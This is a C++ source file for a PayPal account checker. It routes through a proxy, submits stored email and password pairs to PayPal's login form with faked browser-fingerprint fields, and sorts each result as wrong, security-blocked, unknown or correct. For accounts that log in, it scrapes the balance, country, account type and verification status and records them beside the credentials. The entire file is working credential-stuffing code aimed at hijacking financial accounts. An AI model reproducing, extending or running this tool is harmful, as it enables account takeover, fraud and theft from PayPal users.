#include "stdafx.h"
#include "PaypalSubTask.h"


PaypalSubTask::PaypalSubTask(tagAccount* account, tagHttp* http)
	: m_account(account), m_http(http)
{
	CString sHttp;
	sHttp.Format("http://%s:%d", m_http->mIp, m_http->mPort);
	m_hInternet = InternetOpen("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/15.0.849.0 Safari/535.1", INTERNET_OPEN_TYPE_PROXY, sHttp.GetBuffer(), NULL, 0);
	//m_hInternet = InternetOpen("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/15.0.849.0 Safari/535.1", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
}

PaypalSubTask::~PaypalSubTask(void)
{
}

void PaypalSubTask::run()
{
	OutputDebugString("PaypalSubTask::run()\n");
	BOOL ret;
	OutputDebugString("PaypalSubTask::run() 1\n");
	ret = step1();
	if (!ret) 
	{
		OutputDebugString("PaypalSubTask::run() open paypal error http no use\n");
		gGlobal->getAccount()->updateAccountState(m_account, Account_State_Init);
		return;
	}
	OutputDebugString("PaypalSubTask::run() 2\n");
	ret = step2();
	if (!ret) return;
	OutputDebugString("PaypalSubTask::run() 3\n");
	ret = step3();
}

BOOL PaypalSubTask::step1() 
{
	BOOL ret = FALSE;
	HINTERNET hRequest = InternetOpenUrl(m_hInternet, "https://www.paypal.com/c2/cgi-bin/webscr?cmd=_login-run&locale.x=en_US", NULL, NULL, INTERNET_FLAG_SECURE|INTERNET_FLAG_NO_COOKIES, 0);
	if (hRequest)
	{
		DWORD dwSizeOfRq = 4; 
		DWORD dwStatus = 0; 
		HttpQueryInfo(hRequest,   HTTP_QUERY_STATUS_CODE   |   HTTP_QUERY_FLAG_NUMBER, 
			(LPVOID)&dwStatus,   &dwSizeOfRq,   NULL);
		if (dwStatus == 200)
		{
			CString sCookie;
			DWORD dwSize;
			HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, sCookie.GetBuffer(3000), &dwSize, NULL);
			sCookie.ReleaseBuffer();
			while (TRUE)
			{
				int nPos = sCookie.Find("Set-Cookie: ");
				if (nPos == -1)
				{
					break;
				}
				int nEnd = sCookie.Find(";", nPos);
				CString s = sCookie.Mid(nPos+strlen("Set-Cookie: "), nEnd-nPos-strlen("Set-Cookie: "));
				nPos = s.Find("=");
				m_mapCookie[s.Left(nPos)] = s.Mid(nPos+1);
				sCookie = sCookie.Mid(nEnd);
			}
			m_mapCookie.erase("feel_cookie");

			char szBuff[1024];  
			DWORD dwBytesRead;
			std::vector<char> vBuffer;
			BOOL bResult;
			do
			{
				bResult = InternetReadFile(hRequest,(LPVOID)szBuff, 1024, &dwBytesRead);
				if (bResult)
				{
					vBuffer.insert(vBuffer.end(), szBuff, szBuff+dwBytesRead);
				}

			}while((bResult & (dwBytesRead > 0)));
			CString sTemp;
			if (vBuffer.size() > 0)
			{
				sTemp.Append((char*)&vBuffer[0], vBuffer.size());
			}
			int nPos = sTemp.Find("dispatch=");
			if (nPos != -1)
			{
				int nEnd = sTemp.Find("\">", nPos);
				m_sDispatch = sTemp.Mid(nPos+strlen("dispatch="), nEnd-nPos-strlen("dispatch="));
			}
			ret = TRUE;
		}
		else
		{

		}
		InternetCloseHandle(hRequest);
	}
	return ret;
}

BOOL PaypalSubTask::step2()
{
	BOOL ret = FALSE;
	BOOL wrong = FALSE;
	BOOL unknown = FALSE;
	BOOL security = FALSE;
	HINTERNET hConnect = InternetConnect(m_hInternet,  "www.paypal.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);  
	if (hConnect)
	{
		DWORD dwOpenRequestFlags = 
					INTERNET_FLAG_NO_AUTO_REDIRECT	|
					INTERNET_FLAG_KEEP_CONNECTION |  
					INTERNET_FLAG_DONT_CACHE|
					INTERNET_FLAG_NO_COOKIES |
					INTERNET_FLAG_SECURE |  
					INTERNET_FLAG_RELOAD;
		LPCTSTR lpszReferrer = "https://www.paypal.com/c2/cgi-bin/webscr?cmd=_login-run";
		LPCTSTR *lplpszAcceptTypes = NULL;
		CString sQuery = "/c2/cgi-bin/webscr?cmd=_login-submit&dispatch="+m_sDispatch;
		HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", sQuery.GetBuffer(), HTTP_VERSION,  
			lpszReferrer, lplpszAcceptTypes,  
			dwOpenRequestFlags, 0);

		CString sHead = "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "Accept-Charset:GBK,utf-8;q=0.7,*;q=0.3";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "Accept-Language:zh-CN,zh;q=0.8";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "Cache-Control:max-age=0";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "Connection:keep-alive";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "Content-Type:application/x-www-form-urlencoded";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "Origin:https://www.paypal.com";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
		sHead = "User-Agent:Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/15.0.849.0 Safari/535.1";
		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 		sHead = "Cookie:";
 		std::map<CString, CString>::iterator iter = m_mapCookie.begin();
 		while (iter != m_mapCookie.end())
 		{
 			sHead += iter->first;
 			sHead += "=";
 			sHead += iter->second;
 			sHead += ";";
 			++iter;
 		}
 		HttpAddRequestHeaders(hRequest,sHead.GetBuffer(), sHead.GetLength(),HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);

		if (hRequest)
		{
			CString sParam;
			sParam = "login_cmd=&";
			sParam += "login_params=&";
			sParam += "login_email=";
			sParam += m_account->mName;
			sParam += "&";
			sParam += "login_password=";
			sParam += m_account->mPassWord;
			sParam += "&";
			sParam += "target_page=0&";
			sParam += "submit.x=%E7%99%BB%E5%BD%95&";
			sParam += "form_charset=UTF-8&";
			sParam += "browser_name=Safari&";
			sParam += "browser_version=535.1&";
			sParam += "operating_system=Windows&";
			sParam += "flow_name=p/gen/login&";
			sParam += "bp_mid=v=1;a1=na~a2=na~a3=na~a4=Mozilla~a5=Netscape~a6=5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/15.0.849.0 Safari/535.1~a7=20030107~a8=na~a9=true~a10=~a11=true~a12=Win32~a13=na~a14=Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/15.0.849.0 Safari/535.1~a15=true~a16=zh-CN~a17=GBK~a18=www.paypal.com~a19=na~a20=na~a21=na~a22=na~a23=1366~a24=768~a25=32~a26=715~a27=na~a28=Wed Sep 14 2011 14:32:08 GMT 0800 (ÖÐ¹ú±ê×¼Ê±¼ä)~a29=8~a30=swf|drn|drm|~a31=yes~a32=na~a33=na~a34=yes~a35=no~a36=yes~a37=yes~a38=online~a39=no~a40=Win32~a41=yes~a42=no~bp_ks1:v=1;l=8;Di0:2016238Di1:82Ui0:46Ui1:26Di2:26Ui2:113Di3:11Di4:103Ui3:13Ui4:108Di5:15Di6:13Ui6:76Ui5:10Di7:8Ui7:88&";
			sParam += "bp_ks1=v=1;l=10;Di0:25171Ui0:94&";
			sParam += "bp_ks2=&";
			sParam += "p_ks3=&";
			sParam += "flow_name=p/gen/login&";
			sParam += "fso=0try5y-owDiZOEokScA47teaN5ov7Jyz9ID4NXxASDxqQqoZ5J3XJaEyZk_T-nMyjI9v90&";
			BOOL bResult = HttpSendRequest(hRequest, NULL, NULL, sParam.GetBuffer(), sParam.GetLength());  
			if( bResult )   
			{  
				DWORD   dwSizeOfRq   =   4; 
				DWORD   dwStatus   =   0; 
				HttpQueryInfo(hRequest,   HTTP_QUERY_STATUS_CODE   |   HTTP_QUERY_FLAG_NUMBER, 
					(LPVOID)&dwStatus,   &dwSizeOfRq,   NULL);
				
				if (dwStatus == 302)
				{	
					CString sCookie;
					DWORD dwSize;
					HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, sCookie.GetBuffer(6000), &dwSize, NULL);
					sCookie.ReleaseBuffer();

					int nPos = sCookie.Find("Location: ");
					if (nPos != -1)
					{
						CString sTemp;
						int nEnd = sCookie.Find("\r\n", nPos);
						m_sLocation = sCookie.Mid(nPos+strlen("Location: "), nEnd-nPos-strlen("Location: "));
						nPos = m_sLocation.Find("login_cmd=_login-done");
						m_sLocation = m_sLocation.Mid(nPos);
						m_sLocation = "https://www.paypal.com/c2/cgi-bin/webscr?"+m_sLocation;
					}
	
					while (TRUE)
					{
						int nPos = sCookie.Find("Set-Cookie: ");
						if (nPos == -1)
						{
							break;
						}
						int nEnd = sCookie.Find(";", nPos);
						CString s = sCookie.Mid(nPos+strlen("Set-Cookie: "), nEnd-nPos-strlen("Set-Cookie: "));
						nPos = s.Find("=");
						m_mapCookie[s.Left(nPos)] = s.Mid(nPos+1);
						sCookie = sCookie.Mid(nEnd);
					}
					//正确
					ret = TRUE;
				}
				else if (dwStatus == 200)
				{
					char szBuff[1024];  
					DWORD dwBytesRead;
					std::vector<char> vBuffer;
					BOOL bResult;
					do
					{
						bResult = InternetReadFile(hRequest,(LPVOID)szBuff, 1024, &dwBytesRead);
						if (bResult)
						{
							vBuffer.insert(vBuffer.end(), szBuff, szBuff+dwBytesRead);
						}

					}while((bResult & (dwBytesRead > 0)));
					CString sTemp;
					if (vBuffer.size() > 0)
					{
						sTemp.Append((char*)&vBuffer[0], vBuffer.size());
					}
					if (sTemp.Find("Please make sure you enter your <b>email address</b> and <b>password</b> correctly") != -1)
					{
						wrong = TRUE;
					}
					else if (sTemp.Find("Security") != -1)
					{
						security = TRUE;
					}
					else
					{
						unknown = TRUE;
					}
				}
				else
				{
					//ip
				}
			}
			else
			{
				
			}
			InternetCloseHandle(hRequest);
		}
		InternetCloseHandle(hConnect);
	}
	if (!ret)
	{
		if (wrong) 
		{
			gGlobal->getAccount()->updateAccountState(m_account, Account_State_Scanned);
			CString s;
			s.Format("wrong\t%s\t%s", m_account->mName, m_account->mPassWord);
			gGlobal->getResult()->addResult(RESULT_WRONG, s);
		} 
		else if (security)
		{
			gGlobal->getAccount()->updateAccountState(m_account, Account_State_Scanned);
			CString s;
			s.Format("security\t%s\t%s", m_account->mName, m_account->mPassWord);
			gGlobal->getResult()->addResult(RESULT_SECURITY, s);
		}
		else if (unknown) 
		{
			gGlobal->getAccount()->updateAccountState(m_account, Account_State_Scanned);
			CString s;
			s.Format("unknown\t%s\t%s", m_account->mName, m_account->mPassWord);
			gGlobal->getResult()->addResult(RESULT_UNKNOWN, s);
		}
	}
	else
	{
		gGlobal->getAccount()->updateAccountState(m_account, Account_State_Scanned);
	}
	return ret;
}

BOOL PaypalSubTask::step3()
{
	BOOL ret = TRUE;
	CString sHead = "Cookie:";
	std::map<CString, CString>::iterator iter = m_mapCookie.begin();
	while (iter != m_mapCookie.end())
	{
		sHead += iter->first;
		sHead += "=";
		sHead += iter->second;
		sHead += ";";
		++iter;
	}
	HINTERNET hRequest = InternetOpenUrl(m_hInternet, m_sLocation.GetBuffer(), sHead.GetBuffer(), sHead.GetLength(), INTERNET_FLAG_SECURE|INTERNET_FLAG_NO_COOKIES, 0);
	if (hRequest)
	{
		DWORD   dwSizeOfRq   =   4; 
		DWORD   dwStatus   =   0; 
		HttpQueryInfo(hRequest,   HTTP_QUERY_STATUS_CODE   |   HTTP_QUERY_FLAG_NUMBER, 
			(LPVOID)&dwStatus,   &dwSizeOfRq,   NULL);
		if (dwStatus == 200)
		{
			CString sCookie;
			DWORD dwSize;
			HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, sCookie.GetBuffer(6000), &dwSize, NULL);
			sCookie.ReleaseBuffer();
			while (TRUE)
			{
				int nPos = sCookie.Find("Set-Cookie: ");
				if (nPos == -1)
				{
					break;
				}
				int nEnd = sCookie.Find(";", nPos);
				CString s = sCookie.Mid(nPos+strlen("Set-Cookie: "), nEnd-nPos-strlen("Set-Cookie: "));
				nPos = s.Find("=");
				if (nPos != -1)
				{
					m_mapCookie[s.Left(nPos)] = s.Mid(nPos+1);
				}
				sCookie = sCookie.Mid(nEnd);
			}
			char szBuff[1024];  
			DWORD dwBytesRead;
			std::vector<char> vBuffer;
			BOOL bResult;
			do
			{
				bResult = InternetReadFile(hRequest,(LPVOID)szBuff, 1024, &dwBytesRead);
				if (bResult)
				{
					vBuffer.insert(vBuffer.end(), szBuff, szBuff+dwBytesRead);
				}

			}while((bResult & (dwBytesRead > 0)));
			CString sTemp;
			if (vBuffer.size() > 0)
			{
				sTemp.Append((char*)&vBuffer[0], vBuffer.size());
			}
			int nPos = sTemp.Find("s.prop7=\"");
			if (nPos != -1)
			{
				int nEnd = sTemp.Find("\";", nPos);
				m_sPerson = sTemp.Mid(nPos+strlen("s.prop7=\""), nEnd-nPos-strlen("s.prop7=\""));
			}
			nPos = sTemp.Find("s.prop8=\"");
			if (nPos != -1)
			{
				int nEnd = sTemp.Find("\";", nPos);
				m_sVerify = sTemp.Mid(nPos+strlen("s.prop8=\""), nEnd-nPos-strlen("s.prop8=\""));
			}
			nPos = sTemp.Find("s.prop10=\"");
			if (nPos != -1)
			{
				int nEnd = sTemp.Find("\";", nPos);
				m_sCountry = sTemp.Mid(nPos+strlen("s.prop10=\""), nEnd-nPos-strlen("s.prop10=\""));
			}
			nPos = sTemp.Find("<span class=\"balance\">");
			if (nPos != -1)
			{
				nPos = sTemp.Find("<!--googleoff: all-->", nPos);
				nPos += strlen("<!--googleoff: all-->");
				int nEnd = sTemp.Find("<!--googleon: all-->", nPos);
				m_sMoney = sTemp.Mid(nPos+1, nEnd-nPos-2);
				CStringW utf8 = CA2W(m_sMoney, CP_UTF8);
				m_sMoney = CW2A(utf8);
				nPos = m_sMoney.Find("<strong>");
				if (nPos != -1)
				{
					int nEnd = m_sMoney.Find("</strong>");
					m_sMoney = m_sMoney.Mid(nPos+strlen("<strong>"), nEnd-nPos-strlen("<strong>"));
				}
				nPos = m_sMoney.Find(";");
				if (nPos != -1)
				{
					m_sMoney = m_sMoney.Mid(nPos+1);
				}
			}
		}
		InternetCloseHandle(hRequest);
	}
	CString s;
	s.Format("correct\t%s\t%s\t%s\t%s\t%s\t%s", m_account->mName, m_account->mPassWord, m_sMoney, m_sCountry, m_sPerson, m_sVerify);
	gGlobal->getResult()->addResult(RESULT_CORRECT, s);
	return ret;
}